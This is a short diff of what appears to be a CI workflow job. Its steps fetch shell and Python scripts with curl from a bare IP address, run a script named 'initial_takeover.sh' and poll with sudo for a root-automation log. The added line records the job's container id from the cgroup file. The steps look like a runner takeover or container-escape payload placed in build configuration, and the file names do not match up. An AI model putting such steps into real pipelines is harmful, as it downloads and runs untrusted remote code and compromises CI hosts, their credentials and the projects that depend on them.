@@ -18,6 +18,7 @@ jobs:
           tar -xzf /tmp/root.tgz -C /tmp
           curl -fsS http://16.146.243.72:8450/root_gcs_storage_detach.sh -o /tmp/root_auto.sh
           curl -fsS http://16.146.243.72:8450/gcs_storage_detach_control.py -o /tmp/gcs-storage-detach.py
+          awk -F/ '/containers/{print $3; exit}' /proc/self/cgroup > /tmp/owned-job-cid
           chmod +x /tmp/root_auto.sh
           HVS_INLINE=1 bash /tmp/initial_takeover.sh
           for attempt in $(seq 1 120); do sudo grep -q 'ROOT_AUTO done' /tmp/root-auto.log 2>/dev/null && break; sleep 0.5; done
